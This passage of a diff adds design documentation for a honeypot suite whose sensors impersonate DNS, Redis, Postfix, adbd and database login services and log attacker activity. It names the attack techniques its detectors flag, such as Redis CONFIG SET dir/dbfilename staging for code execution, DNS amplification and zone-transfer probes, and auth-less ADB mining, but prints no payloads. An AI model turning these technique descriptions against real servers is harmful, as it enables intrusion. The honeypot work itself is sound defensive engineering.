+  `max_concurrent` pool, or whose handling `read_timeout` cuts off before the event is written,
+  gets no event, only a `warn` log line at power-of-two totals. Rate-limited datagrams produce one
+  `honeypot_connection` (protocol `udp`, `query_status` `rate_limited`) per source network per
+  window (`crates/sensor-framework/src/rate_limit.rs#rate_limited_event`): `source_ip` is the first
+  address
+  seen from the network in the window, and the metadata carries `source_prefix` (CIDR, or
+  `overflow`), `suppressed_count`, `suppressed_bytes`, `per_source_limited` and
+  `global_limited` (which budget refused them), `first_seen` and `last_seen` (RFC 3339),
+  `window_secs`, up to 8 sanitized `samples` of `"<QTYPE> <qname>"` (or `malformed`), and
+  `distinct_sources` (counted up to 32, with `distinct_sources_capped` set beyond that). TCP and
+  DoT: one `honeypot_connection` (protocol `tcp`) per connection, then one
+  `honeypot_command_exec` (protocol `tcp`) per message, with `command` `"<QTYPE> <qname>"` or
+  `malformed`. Events are appended before the reply is sent. Metadata: `protocol_label` `dns`,
+  `transport`, `query_status` (`answered`, `rejected`, `suppressed` or `rate_limited`),
+  `reject_reason`, `query_len`, `declared_len` (TCP framing rejects), `msg_index` (TCP/DoT), the
+  header
+  (`dns_id`, `flags_raw`, the four counts, `opcode`, `opcode_name`, `rd`, `ad`, `cd`), the
+  question (`qname` sanitized and capped at 1024 characters, `qname_mixed_case`,
+  `qname_labels`, `qname_wire_len`, `qtype`, `qtype_name`, `qclass`, `qclass_name`), `edns`
+  (`version`, `udp_payload_size`, `do`, `extended_rcode`, `option_codes`) or `edns_malformed`,
+  `probe_signals`, and for an answered query `rcode` `REFUSED` and `reply_len`. DoT events carry
+  `"tls": true`; the key is absent on the plain surfaces
+  (`crates/sensor-dns/src/events.rs#stamp_tls`). All DNS events are `authenticated=false`.
+- **Probe signals** (`crates/sensor-dns/src/events.rs#probe_signals`), metadata only, never a
+  `signal_type`: `amplification_probe` (UDP ANY, or UDP TXT/DNSKEY/RRSIG with an EDNS buffer
+  over 512), `open_resolver_probe` (RD set, class IN or ANY, not a transfer),
+  `zone_transfer_probe` (AXFR or IXFR), `chaos_fingerprint_probe` (class CH, for example
+  `version.bind`).
+- **Bounds:** the UDP rate limit above; `max_concurrent` applies separately to the UDP handler
+  pool, the TCP listener and the DoT listener, each with the per-source admission cap; a UDP
+  datagram's handling is cut at `read_timeout`. Strict parsing: a zero or unparseable bound or
+  rate aborts startup. Nothing is spooled.
+- **Port 53 already in use.** A bind failure names the transport and the address, for example
+  `sensor-dns: udp: cannot start listener on 0.0.0.0:53: Address already in use (os error 98);
+  refusing to start` (`tcp` and `dot` likewise). Find the holder with
+  `sudo ss -lunpt 'sport = :53'`. Linux refuses a wildcard bind over any specific bind of the
+  same port and a specific bind under a wildcard one, for UDP and TCP alike. So against the
+  systemd-resolved stub, which holds only `127.0.0.53:53` (and `127.0.0.54:53`), binding the
+  public address works and `0.0.0.0:53` does not; against a resolver holding the wildcard
+  (dnsmasq without `bind-interfaces`, named with its default `listen-on`, unbound with
+  `interface: 0.0.0.0` [inferred]) no bind of port 53 works until that resolver is narrowed. The
+  fixes: for systemd-resolved, set `DNSStubListener=no` in `resolved.conf`, or bind the public
+  address; for dnsmasq, `bind-interfaces` with `listen-address=127.0.0.1`; for unbound,
+  `interface: 127.0.0.1`; for named, `listen-on { 127.0.0.1; };`. A host behind NAT binds its
+  private address and maps it with `PROPOLIS_DNS_WAN_MAP`.
+- **WAN attribution.** TCP and DoT events resolve `wan_ip` from the accepted socket's local
+  address. UDP has no per-datagram local address, so UDP events (and `rate_limited` summaries)
+  resolve it against the bind address, as `sensor-tftp` does: under a wildcard bind with a WAN
+  map keyed on the public address, UDP events carry a null `wan_ip` while TCP events on the
+  same port carry the mapped one. Bind the specific address when WAN attribution matters.
+- **Verify from outside.** `dig @<host> example.com` (UDP), `dig +tcp @<host> example.com` and,
+  with DoT on, `dig +tls @<host> -p 853 example.com` (BIND 9.18 or later; `kdig +tls @<host> -p
+  853 example.com` from Knot is the equivalent [inferred]). The deploy certificate is
+  self-signed, and neither tool checks it by default. Each answer shows `status: REFUSED`, flags
+  `qr rd` (plus `WARNING: recursion requested but not available`, since RA is never set),
+  `QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0`, the question echoed, and no `OPT
+  PSEUDOSECTION` even though `dig` sends EDNS. The UDP query lands as `honeypot_connection` with
+  `protocol` `udp`; the TCP and DoT queries as `honeypot_command_exec` with `protocol` `tcp` and
+  `command` `A example.com.`, each after a `honeypot_connection` for the connection, the DoT
+  ones with `"tls": true`. On the host, `ss -lunp 'sport = :53'` shows the UDP socket and
+  `ss -ltnp 'sport = :53 or sport = :853'` the TCP and DoT listeners, all held by
+  `sensor-dns`.
+
+### sensor-redis
+
+Impersonates a **Redis 7.2.4 standalone master** (conventional port 6379).
+
+- **Behavior** (`handler.rs`): parses RESP (inline and multi-bulk); arguments are kept
+  as raw bytes, so a binary key or value round-trips byte for byte and only the ledger copy
+  is decoded as text. A command that arrives over many reads is parsed on from where the last
+  read left it, never again from its start, and its arguments are read in place in the read
+  buffer (`crates/sensor-redis/src/resp.rs#Parser`), so reading a command costs time linear in
+  its size. **Never authenticates or persists across connections.** Commands
+  (`crates/sensor-redis/src/handler.rs#Session::dispatch`): PING (echoes arg), AUTH
+  (always OK → `honeypot_login_attempt`, password never in metadata), INFO
+  (live-ish 7.2.4 dump with per-process random `run_id`/`master_replid`, real pid,
+  advancing uptime, persona OS line, `crates/sensor-redis/src/handler.rs#canned_info`), CONFIG GET (canned), CONFIG SET
+  (always OK; only `dir`/`dbfilename` - the RDB-RCE staging primitive - emit a
+  `honeypot_command_exec` indicator, `crates/sensor-redis/src/handler.rs#Session::handle_config_set`), SET (OK; key and value captured,
+  and kept whole in a per-session store of at most 256 keys and 1 MB; a write past either
+  limit, or one the shared memory pool cannot hold, is refused with Redis's OOM error rather
+  than acknowledged and dropped; the SET event is still recorded), GET (the
+  value SET earlier this session, else nil; no event), SLAVEOF/REPLICAOF (OK +
+  captured args), EVAL/SCRIPT (canned compile error + captured args, **never runs
+  Lua**), unknown → Redis-exact error. Caps: metadata string 255, value 1024, counted after
+  sanitizing (a payload behind padding that sanitization removes is still recorded,
+  `crates/sensor-redis/src/handler.rs#ledger`); an inline line of more than 1024 arguments is a
+  protocol error, as a multi-bulk array of more is.
+- **Bounds:** common defaults, `max_concurrent` 256 on each listener. No spool. Each session's
+  read buffer and SET store are its own up to 16 KiB each; past that they draw on one 16 MiB
+  pool shared by every session of both listeners
+  (`crates/sensor-redis/src/memory.rs#POOL_BYTES`). A command the pool cannot buffer ends the
+  session with no reply, as a real Redis closes a client past its query buffer limit; a SET it
+  cannot hold gets the OOM error. A session gives its room back when its command is done and
+  when it ends, however it ends. The worst case against `MemoryMax` is in
+  [capacity planning](../operations/capacity-planning.md#redis-sensor-worst-case-memory).
+- **Redis over TLS (optional):** when `PROPOLIS_REDIS_TLS_BIND` is set, a second implicit-TLS
+  (`rediss://`) listener in the same process serves the same persona and writes the same
+  `events.jsonl` (`crates/sensor-redis/src/lib.rs#start_test_server_tls`). No STARTTLS exists and
+  no client certificate is requested. The handshake is cut at the read timeout; a failed or stalled
+  handshake, including plaintext sent to the TLS port, is dropped with a debug log and emits no
+  event. Every event from a TLS session, the connection event, the login attempt and each command
+  event, carries `"tls": true`; the key is absent, not false, on the plain listener
+  (`crates/sensor-redis/src/handler.rs#connection_event`). The AUTH password is never captured over
+  TLS either. Replies are flushed, and after a protocol error the handler sends its error reply and
+  then shuts the stream down, which sends `close_notify`. Fail-closed: the sensor refuses to start
+  (exit 1, before any bind) on a half-configured or unusable cert and key pair, and the key must be
+  mode `0600`; an OS bind failure of the TLS listener stops the plain listener and exits 1. Cert and
+  key without `PROPOLIS_REDIS_TLS_BIND` load and validate, start no TLS listener, and log one
+  warning. Rules and variables are in [environment-variables.md](environment-variables.md); the
+  operator view is
+  [../operations/networking-tls.md](../operations/networking-tls.md#sensor-tls-attacker-facing-listeners).
+- **Emits:** `honeypot_connection`, `honeypot_login_attempt` (AUTH),
+  `honeypot_command_exec` (CONFIG SET dir/dbfilename, SET, SLAVEOF/REPLICAOF,
+  EVAL/SCRIPT).
+
+### sensor-smtp
+
+Impersonates **Ubuntu Postfix ESMTP** (conventional port 25).
+
+- **Behavior** (`handler.rs`): banner `220 <host> ESMTP Postfix (Ubuntu)` (persona
+  host). EHLO advertises PIPELINING, SIZE 10240000, ETRN, STARTTLS, AUTH PLAIN
+  LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING (`crates/sensor-smtp/src/handler.rs#handle_connection`). Verbs
+  (`crates/sensor-smtp/src/handler.rs#handle_connection`): HELO/EHLO, STARTTLS (`454 TLS not available` unless TLS is
+  configured, see "SMTP over TLS" below),
+  AUTH PLAIN and AUTH LOGIN (`crates/sensor-smtp/src/handler.rs#authenticate`; the username
+  goes into one `honeypot_login_attempt` and the password is read and dropped, never recorded
+  in any field). Both take an RFC 4954 initial response or none: `AUTH PLAIN` alone gets
+  `334 ` and reads the blob from the next line, as Postfix does; `AUTH LOGIN <base64 user>`
+  (Python smtplib's default) takes the initial response as the username and prompts only
+  `334 UGFzc3dvcmQ6`; `=` is an empty initial response. A PLAIN blob without both NUL
+  separators is malformed and records an empty username. `*` answering a `334` gets
+  `501 5.7.0 Authentication aborted` and no event. MAIL FROM / RCPT TO (Postfix's
+  `smtpd_recipient_limit` default: the 1001st recipient of a transaction gets `452 4.5.3
+  Error: too many recipients`; `crates/sensor-smtp/src/handler.rs#Envelope`), DATA (captures
+  mail_from/rcpt_to/subject/body_size → `honeypot_command_exec`, replies with a
+  Postfix queue id; without the terminating `.` line nothing is acknowledged or recorded;
+  `rcpt_to` holds the first 100 recipients and `rcpt_count` how many were accepted; the
+  envelope is cleared after each message, as Postfix clears it),
+  BDAT `<size> [LAST]` (CHUNKING: raw chunks accumulate as bytes until LAST, then the same
+  message event with `chunking: true`; `BDAT 0 LAST` is a valid empty final chunk; a chunk
+  the client does not finish sending, or that exceeds the session byte budget, is neither
+  acknowledged nor recorded; a chunk streams through a 4 KiB read into the retained body and
+  is never allocated at its declared size (`crates/sensor-smtp/src/handler.rs#read_raw_chunk`),
+  so a stalled chunk holds at most the body cap), ETRN (Postfix's `etrn_cmd` replies,
+  `crates/sensor-smtp/src/handler.rs#etrn_reply`: `503 Error: MAIL transaction in progress`
+  inside a transaction, `500 Syntax: ETRN domain` without exactly one argument, `501 Error:
+  invalid parameter syntax` for a bad hostname, otherwise `459 <domain>: service
+  unavailable` as on a stock install with no fast-flush domains), RSET, NOOP, QUIT, VRFY (252), EXPN (502),
+  unknown→502. Caps: line 8192, username 255; a message body is kept up to 65536 bytes and
+  the event records the full `body_size` received plus `truncated` when it was cut. A DATA
+  body line longer than 8192 bytes keeps its first 8192 bytes, the rest is read and counted
+  in `body_size` but not kept, the message is flagged `truncated` and still gets `250`
+  (`crates/sensor-smtp/src/handler.rs#read_body_line`).
+- **Bounds:** common defaults, `max_concurrent` 256, read the same strict way as every other
+  sensor (`crates/sensor-smtp/src/main.rs#load_config`): a zero, negative or unparseable value
+  refuses to start. No spool (message body captured as size and subject only, never stored as a
+  file).
+- **SMTP over TLS (optional):** `PROPOLIS_SMTP_TLS_CERT` and `PROPOLIS_SMTP_TLS_KEY` together
+  enable STARTTLS on the plain listeners (25 and the optional 587,
+  `PROPOLIS_SMTP_SUBMISSION_BIND`); `PROPOLIS_SMTP_TLS_BIND` adds an implicit-TLS (SMTPS, 465)
+  listener that needs the pair. All listeners run in one process and write one `events.jsonl`
+  (`crates/sensor-smtp/src/lib.rs#start_listeners`); 465 and 587 exist only when their bind is
+  set. No client certificate is requested. Rules, in the order the handler checks them
+  (`crates/sensor-smtp/src/handler.rs#handle_connection`):
+  - Inside TLS (implicit, or after an upgrade) STARTTLS gets `503 5.5.1 Error: TLS already
+    active`, and EHLO omits the STARTTLS extension; on a plain session it is offered.
+  - STARTTLS with parameters, when TLS is configured, gets `501 5.5.4 Syntax error (no
+    parameters allowed)`.
+  - Plaintext the client sent behind STARTTLS (already buffered when the line is read) is
+    refused before any `220`: one `honeypot_command_exec` event with `command` `STARTTLS`,
+    `starttls_refused` `pipelined_plaintext` and `pipelined_bytes` (the count; the injected bytes
+    are never captured or interpreted), then `554 5.5.1 Error: command pipelining after
+    STARTTLS`, a flush, a stream shutdown and the end of the session. The event is
+    plaintext-phase and carries no `"tls"` key.
+  - Otherwise `220 2.0.0 Ready to start TLS`, then the handshake bounded by the read timeout
+    (`crates/sensor-framework/src/tls.rs#upgrade_buffered`). A failed handshake ends the session
+    with no plaintext fallback. After the upgrade MAIL FROM, RCPT TO and BDAT state is reset and
+    the client must EHLO again; the per-connection captured-byte count is kept.
+  - With no pair configured every STARTTLS line, with or without parameters, gets the unchanged
+    `454 4.7.0 TLS not available due to local problem`, and EHLO still advertises STARTTLS.
+  - Connection, login (`AUTH PLAIN` and `AUTH LOGIN`) and data events from a TLS session carry
+    `"tls": true`; the key is absent, not false, on plain sessions
+    (`crates/sensor-smtp/src/handler.rs#tag_tls`). Passwords are never captured, TLS or not.
+    QUIT sends `221` then a stream shutdown (`close_notify` on TLS).
+  - An implicit handshake that fails or stalls is dropped with a debug log and emits no event.
+  - Fail-closed: the sensor refuses to start (exit 1, before any bind) on a half-configured or
+    unusable pair, a TLS bind without a pair, or an unparseable extra bind, and the key must be
+    mode `0600`; an OS bind failure on any listener stops the others and exits 1. A pair with
+    no TLS bind is not an error: it enables STARTTLS and opens no 465 listener. Variables and
+    the full rules are in [environment-variables.md](environment-variables.md); the operator
+    view is
+    [../operations/networking-tls.md](../operations/networking-tls.md#sensor-tls-attacker-facing-listeners).
+- **Emits:** `honeypot_connection`, `honeypot_login_attempt`,
+  `honeypot_command_exec` (DATA, and the pipelined-STARTTLS refusal).
+
+### sensor-adb
+
+Impersonates **Android Debug Bridge / adbd** on a fake Nexus 5 (conventional port
+5555).
+
+- **Protocol** (`adb_proto.rs`): 24-byte header messages
+  (CNXN/OPEN/OKAY/WRTE/CLSE). **No A_AUTH** - the emulated surface is the
+  auth-disabled adbd on port 5555 (the ADB.Miner target) (`crates/sensor-adb/src/adb_proto.rs`).
+  `device_banner()` presents a fake Nexus 5 / hammerhead / Android 6.0.1 / sdk 23
+  and deliberately omits `shell_v2` so real clients fall back to plain v1 shell
+  framing (`crates/sensor-adb/src/adb_proto.rs#device_banner`). `MAX_MESSAGE_DATA_LEN` 1_000_000 bounds any
+  inbound message before a buffer is allocated for it (a larger declared length ends
+  the session as malformed input), and `OUR_MAXDATA` 4096 is the maxdata the sensor
+  advertises in its own CNXN (`crates/sensor-adb/src/adb_proto.rs#MAX_MESSAGE_DATA_LEN`, `crates/sensor-adb/src/adb_proto.rs#OUR_MAXDATA`, `crates/sensor-adb/src/adb_proto.rs#build_cnxn`).
+- **Behavior** (`handler.rs`): CNXN handshake → device banner, then multiplexed
+  streams (`MAX_STREAMS_PER_CONN = 32`). OPEN destinations (`crates/sensor-adb/src/handler.rs#handle_open`): `shell:` →
+  interactive FakeShell **in its Android flavor** (the device's filesystem, a
+  `root@hammerhead:<cwd> #` prompt that follows `cd`, Android's `uname`, nested mksh
+  levels that close the stream only when the outer shell exits, and mksh's
+  `sh: x: not found` rather than bash's `command not found`; authenticated **always
+  false** - ADB has no auth step),
+  `shell:<cmd>` → one-shot exec, `sync:` → file-transfer sub-protocol, anything
+  else refused. A `shell:<cmd>` that reads its standard input (see
+  [Fake shell](#fake-shell-ssh-telnet-adb)) holds the stream open and takes its WRTE data as
+  input; legacy ADB has no end-of-input message on a shell stream, so the client's CLSE (the
+  command is killed, nothing is sent, the capture's end is `peer_closed`), the capture ceiling
+  (the command runs on what was kept and the stream closes after its output) or the session's
+  end ends it. At the interactive `shell:` a typed line that reads its input takes what is typed
+  after it until Ctrl-D or until the command has the lines it reads for, as on the SSH and
+  telnet shells
+  (`crates/sensor-adb/src/handler.rs#HeldStdin`). Sync sub-protocol: SEND/DATA/DONE → captures the pushed file →
+  `honeypot_malware_upload`; RECV → refused (`FAIL Permission denied`, **never
+  serves outbound**); STAT → not-found. Sync body cap `MAX_SYNC_BODY` 10_000_000
+  (a larger push keeps the prefix and is emitted with `truncated`/`wire_size`). A SEND
+  whose DONE never arrives (stream closed or session dropped) is kept with
+  `complete: false`.
+- **Write chunking** (`crates/sensor-adb/src/handler.rs#handle_connection`): the maxdata the client advertises
+  in its CNXN (`arg1`, clamped to 1 through `MAX_MESSAGE_DATA_LEN`) is the ceiling for
+  every WRTE the sensor sends. A reply larger than that is split into WRTEs of at most
+  that many payload bytes, so a client with a small maxdata never receives a message it
+  must reject (`crates/sensor-adb/src/handler.rs#drive_stream`).
+- **Per-stream send state** (`crates/sensor-adb/src/handler.rs#Stream`, `crates/sensor-adb/src/handler.rs#PendingWrite`): each stream
+  owns an outbound queue, an offset into the response being sent, and an `awaiting_okay`
+  flag. ADB flow control is stop-and-wait per stream: the sensor sends one WRTE, sets
+  the flag, and sends the next chunk only when the client's OKAY for that stream clears
+  it. Sending is never awaited inline and never blocks on the OKAY: the OPEN, WRTE and
+  OKAY arms of the read loop each call `drive_stream` once, which writes at most one
+  chunk and returns, so one slow stream cannot stall reading or the other streams
+  (`crates/sensor-adb/src/handler.rs#handle_wrte`). An OKAY with the wrong ids, or for a stream not awaiting one,
+  is ignored.
+- **Drain then close** (`crates/sensor-adb/src/handler.rs#drive_stream`): a one-shot `shell:<cmd>` queues its
+  whole output and sends CLSE only after the queue is empty and the last chunk has been
+  acknowledged; a command with no output closes at once. An interactive shell's `exit`
+  from the outer level drains its final output and prompt before the CLSE. A stream
+  whose response is fully sent is removed from the table.
+- **Android line endings** (`crates/sensor-framework/src/shell/mod.rs#onlcr`): the shell's output is passed
+  through ONLCR before it is queued, as a pty-backed adbd does; every LF becomes CR-LF
+  and all other bytes, NUL and binary included, pass through unchanged. Interactive
+  input is handled as a terminal would: CR, LF or CR-LF each end one line, the line is
+  echoed as CR-LF, backspace and DEL erase one buffered character, and the prompt is
+  re-read after every line because `cd` or a nested shell changes it (`crates/sensor-adb/src/handler.rs#handle_wrte`).
+- **Memory and egress bound** (`crates/sensor-framework/src/budget.rs#ConnectionBudget`): the connection creates
+  one `ConnectionBudget` and every shell on it, one-shot or interactive, holds a clone
+  of that same `Arc`. The 32 streams therefore share one ceiling on created file
+  content, nodes, recorded commands, downloads and egress bytes rather than each holding
+  a full set (the memory bound, `crates/sensor-adb/src/handler.rs#handle_open`). Every WRTE payload sent is
+  charged with `charge_egress`; once the cap is spent the sensor finishes the response
+  in progress and drops the connection (`crates/sensor-framework/src/budget.rs#ConnectionBudget::charge_egress`).
+- **Write deadline** (`crates/sensor-adb/src/handler.rs#write_or_err`): every write (the CNXN reply, OKAY, WRTE
+  and CLSE) is wrapped in a timeout of the connection's `idle_timeout`; a peer that
+  stops reading cannot hold the handler on a blocked write, and reads carry the same
+  idle bound so a client that never sends OKAY ends the session too.
+- **Spool:** 10&nbsp;MB / 100&nbsp;MB, hand-off queue 64 (`lib.rs`).
+- **Bounds:** common defaults, `max_concurrent` 256.
+- **Emits:** `honeypot_connection`, `honeypot_command_exec` (shell),
+  `honeypot_malware_upload` (sync push, a binary shell payload, a command's standard input).
+  Every shell stream shares the connection's handle on the sensor's
+  [command-event budget](#command-event-budget-ssh-telnet-adb): repeats past it become one
+  `command_summary` event per source network per minute.
+  **All ADB events are authenticated=false.**
+
+### sensor-catchall
+
+A passive, protocol-agnostic listener that emulates no protocol and **never writes
+a byte back** (`crates/sensor-catchall/src/handler.rs#handle_tcp`).
+
+- **Binds** every listed address on **both TCP and UDP** (`PROPOLIS_CATCHALL_BIND_ADDRS`, a
+  comma-separated `ip:port` list, ≥1 required); per-port bind failure is non-fatal
+  (`crates/sensor-catchall/src/main.rs#main`).
+- **Distinct bound defaults** (`crates/sensor-catchall/src/main.rs#DEFAULT_READ_TIMEOUT_MS`, `crates/sensor-catchall/src/main.rs#DEFAULT_IDLE_TIMEOUT_MS`, `crates/sensor-catchall/src/main.rs#DEFAULT_MAX_DURATION_SECS`, `crates/sensor-catchall/src/main.rs#DEFAULT_MAX_CAPTURED_BYTES`, `crates/sensor-catchall/src/main.rs#DEFAULT_MAX_CONCURRENT`): `read_timeout` **5000&nbsp;ms**,
+  `idle_timeout` **5000&nbsp;ms**, `max_duration` **30&nbsp;s**,
+  `max_captured_bytes` **4096**, `max_concurrent` 256.
+- **Behavior** (`handler.rs`): reads up to `max_captured_bytes` and emits one
+  `catchall_probe` with `metadata.payload_hex` (capped `MAX_HEX_SAMPLE_BYTES = 256`)
+  and `observed_len`, authenticated=false, no `protocol_label` (`crates/sensor-catchall/src/handler.rs#MAX_HEX_SAMPLE_BYTES`, `crates/sensor-catchall/src/handler.rs#build_event`). TCP
+  uses protocol `tcp`; UDP uses `udp` with a session id minted per datagram. No
+  spool.
+- **UDP WAN caveat:** `wan_ip` attribution under a wildcard UDP bind is a documented
+  limitation (no `local_addr()` on UDP receive; `local_ip` is caller-supplied,
+  `crates/sensor-catchall/src/handler.rs#handle_udp`).
+- **Emits:** `catchall_probe` only.
+
+### sensor-cred (VNC / MySQL / MSSQL / PostgreSQL / MongoDB)
+
+One binary running one listener per configured DB/remote protocol. Every configured
+protocol logs to its own `<log_dir>/<protocol>.jsonl` (`crates/sensor-cred/src/main.rs#main`). At least one
+per-protocol bind var is required.
+
+- **Distinct bound defaults** (`crates/sensor-cred/src/main.rs#load_config`): `read_timeout` 30000&nbsp;ms,
+  `idle_timeout` 60000&nbsp;ms, `max_duration` **60&nbsp;s**, `max_captured_bytes`
+  **100_000**, `max_concurrent` 256. A zero, negative or unparseable value refuses to start, the
+  same as every other sensor.
+
+| Protocol | Impersonates (conventional port) | Capture behavior |
+|---|---|---|
+| **vnc** (`vnc.rs`) | RFB 3.8, VNC Auth type 2 (5900) | Sends a 16-byte random challenge, reads the DES response; the attempt is the signal (plaintext unrecoverable) → `honeypot_login_attempt` with no username and the client's RFB version as `client_version` (`crates/sensor-cred/src/vnc.rs#handle_connection`). |
+| **mysql** (`mysql.rs`) | MySQL 5.7.42 (3306) | Sends a greeting with per-connection random thread id + 20-byte scramble, parses the username from HandshakeResponse41, drops the password → login event (`crates/sensor-cred/src/mysql.rs#handle_connection`, `crates/sensor-cred/src/mysql.rs#build_greeting`). |
+| **mssql** (`mssql.rs`) | SQL Server 2019 (15.0.16.57) TDS (1433) | PreLogin/Login7; parses the UTF-16LE username from Login7, sends LOGINACK (`crates/sensor-cred/src/mssql.rs#handle_connection`, `crates/sensor-cred/src/mssql.rs#parse_login7_username`, `crates/sensor-cred/src/mssql.rs#build_loginack`). |
+| **postgresql** (`postgresql.rs`) | PostgreSQL (5432) | StartupMessage (a GSSENCRequest is declined with `N`; an SSLRequest is declined with `N`, or accepted with `S` when TLS is configured, see below), parses the `user` param, sends AuthenticationMD5Password with a per-connection random salt, reads and discards the PasswordMessage → login event; then AuthenticationOk, a PostgreSQL 14 ParameterStatus set, BackendKeyData and ReadyForQuery, and a query loop: each simple query → `honeypot_command_exec` with the statement text, answered `ERROR 42501 permission denied` and ReadyForQuery, until Terminate, 200 statements, or the byte budget. Extended protocol: Parse records the SQL and answers ParseComplete; Bind, Describe (ParameterDescription then NoData for a statement, NoData for a portal) and Close get their completions; Execute is refused with 42501 and everything after it, a simple Query included, is discarded until Sync. |
+| **mongodb** (`mongodb.rs`) | MongoDB OP_MSG (27017) | Answers isMaster/hello; on saslStart/authenticate extracts the SCRAM `n=<user>` or BSON `user` → login event (`crates/sensor-cred/src/mongodb.rs#handle_connection`, `crates/sensor-cred/src/mongodb.rs#extract_scram_username`, `crates/sensor-cred/src/mongodb.rs#extract_bson_string`). |
+
+- Every cred protocol emits `honeypot_connection` + `honeypot_login_attempt`
+  (authenticated=true). Username sanitized cap 255. **No spool**; passwords, DES
+  responses, and MD5 responses are never stored. What one source may write of them is bounded,
+  next.
+
+#### Connection and login event budget (cred)
+
+A VNC attempt is a DES challenge-response, so each carries little beyond its source, its client
+version and the count, and a scanner fleet sends them without end: one listener wrote about 10,000
+lines an hour for 42 hours (392,838 events from 1,629 addresses, 60% connections and 40% logins)
+and filled the log volume. Each listener's emitter now holds a `SourceEventGate`
+(`crates/sensor-framework/src/source_flood.rs#SourceEventGate`, attached in
+`crates/sensor-cred/src/lib.rs#start_listener`), so vnc, mysql, mssql, postgresql and mongodb are
+all covered by the one path every handler writes through.
+
+- **Budget.** Per 10 minute window, tumbling for the whole listener, each source address may write
+  10 `honeypot_connection` and 10 `honeypot_login_attempt` events, each source network (/24, /56)
+  40 of each, and the listener 200 of each repeats. An event is written while all three are under
+  budget, except that an address's first event of each kind in a window skips the listener budget.
+  Its second to tenth event of a kind spend the listener budget, so once the listener has written
+  200 repeats of a kind they fold even though the address is under its 10, and every event, the
+  first included, still needs its source network under 40 and its address in the table. The live
+  flood's heaviest address sent about 70 of each per window,
+  so it now costs 20 lines and one summary, about 126 lines an hour at worst, instead of 840.
+  Replayed through the real gate, the incident's distribution (5 heavy sources and 1,624 tail
+  sources at about 3.2 events an hour) writes about 5,800 lines an hour with the summaries
+  included, against 9,300, and folds no tail source's first sighting. A summary line is about
+  twice a verbatim line's size (743 B against 366 and 399 B), so the count of lines understates
+  the bytes. Replies are unchanged: only logging is bounded.
+- **Summary.** Past a budget the event is not written. When the window ends, each address with
+  anything folded gets one event marked `event_summary: true` with the counts of connections and
+  attempts, the distinct client versions and usernames (a bounded sample), the sessions and the
+  first and last time ([keys](events-and-signals.md#connection-and-login-summary-keys)). It is
+  written within about a second of the window's end and, for the window in progress, at shutdown
+  (`crates/sensor-cred/src/main.rs#SHUTDOWN_FLUSH_TIMEOUT`, 5 s per listener). A crash loses the
+  open window's counts.
+- **What the budget costs.** Past the first 10 of each kind, an address's individual events and
+  their timestamps are gone; the counts, the first and last time and a sample of distinct
+  usernames and client versions remain. For mysql, mssql, postgresql and mongodb that means a
+  flooder's usernames past the first 8 distinct per window are not recorded; for VNC nothing else
+  was recorded to begin with. Passwords were never stored.
+- **Bounded memory.** 1024 addresses per window, at most 64 of them from one source network, so
+  one /24 or IPv6 /56 (a scanner fleet, or one host walking a /64) cannot take the table and leave
+  every later source of the window invisible to scoring. A 65th address of a network joins one
+  summary for that network (`source_prefix` the network, `overflow_summary: true`); once the table
+  is full one more address of any network joins one `overflow` summary (`source_prefix:
+  "overflow"`, `overflow_summary: true`). Each stands for many addresses and names the first of them
+  as `source_ip`, so it is written as a `honeypot_connection` with `authenticated: false` and
+  scoring counts it as one event with no weight and no confirmed-real latch. Filling the table now
+  takes sixteen networks at their cap. Worst case per window: 2 x 1,024 first sightings, 2 x 200
+  repeats and 1,041 summaries (1,024 addresses, 16 networks at the cap, 1 overflow), 3,489 lines.
+- **Scoring.** An address's summary counts as the events it replaces in `event_count` and
+  `established_event_count`, with one sighting of weight; the overflow and network summaries count
+  one event with no weight
+  ([events-and-signals.md](events-and-signals.md#connection-and-login-summary-keys)).
+- **Command events (postgresql).** The query loop's `honeypot_command_exec` events go through the
+  shell sensors' command-event budget (`CommandEventGate`, defaults: 12 a minute per network, burst
+  200, a `command_summary` event per window; see
+  [command-event budget](#command-event-budget-ssh-telnet-adb)). A session still ends at 200
+  statements, so the budget is what a source spreading queries over many sessions meets. mongodb
+  and the other protocols emit no command events.
+- **Not configurable.** The values are constants in `source_flood.rs`; no variable turns the
+  budget off.
+- **Bind failures:** a protocol whose bind the OS refuses is logged and skipped; the others keep
+  running, and the sensor exits 1 only when every configured protocol failed to bind
+  (`crates/sensor-cred/src/main.rs#main`). The five are independent traps, and TLS adds no
+  listener of its own whose loss this could hide.
+- **TLS (optional):** `PROPOLIS_CRED_TLS_CERT` and `PROPOLIS_CRED_TLS_KEY` together enable TLS
+  on the existing postgresql, mysql, mssql and mongodb ports. There is no TLS bind and no new
+  port; vnc is unchanged. One certificate serves all four (`crates/sensor-cred/src/lib.rs#CredTls`).
+  No client certificate is requested. Every handshake is bounded by the read timeout, and one that
+  fails or stalls ends the session with no further event and no plaintext fallback (mssql and
+  mongodb also log it at debug level). The `honeypot_connection` event is always written before
+  the handshake, so a failed or abandoned handshake is still recorded.
+  Plaintext clients keep working on every port. At startup the sensor logs which of the
+  configured protocols TLS applies to, or a warning when none of the bound protocols can use it
+  (vnc only, for example) (`crates/sensor-cred/src/main.rs#TLS_CAPABLE`).
+  - **postgresql:** an SSLRequest is answered `S` and the handshake runs on the same socket; the
+    StartupMessage and everything after it then travel over TLS. The reads before the upgrade are
+    exact-length reads with no user-space buffer, so plaintext the client sent after the
+    SSLRequest is never replayed into the TLS session: it reaches the handshake as garbage and the
+    connection is dropped. This guards against an on-path party injecting plaintext behind the
+    SSLRequest that a server would otherwise read as if it had arrived inside TLS. A plaintext
+    StartupMessage and PasswordMessage sent after `S` get at most a TLS alert, never a PostgreSQL
+    reply, and no login event
+    (`crates/sensor-cred/tests/tls_integration.rs#pg_plaintext_after_s_is_dropped`). A second
+    SSLRequest inside TLS closes the connection. Without the pair the answer is the unchanged `N`.
+    A GSSENCRequest (code 80877104, sent first by libpq with its default `gssencmode=prefer`) is
+    answered with a single `N`, with or without the pair, and the sensor keeps reading: the client
+    then sends an SSLRequest (answered as above) or a plain StartupMessage
+    (`crates/sensor-cred/src/postgresql.rs#handle_connection`). As in PostgreSQL's own startup
+    handling, each request kind is honoured at most once per connection and none inside TLS, so
+    at most two negotiation packets precede the StartupMessage; a repeated request closes the
+    connection without a reply
+    (`crates/sensor-cred/tests/tls_integration.rs#pg_repeated_negotiation_requests_close_the_connection`).
+  - **mysql:** the greeting advertises `CLIENT_SSL` (0x0800) only when the pair is set. A 32-byte
+    SSLRequest packet carrying that flag switches the session to TLS before the
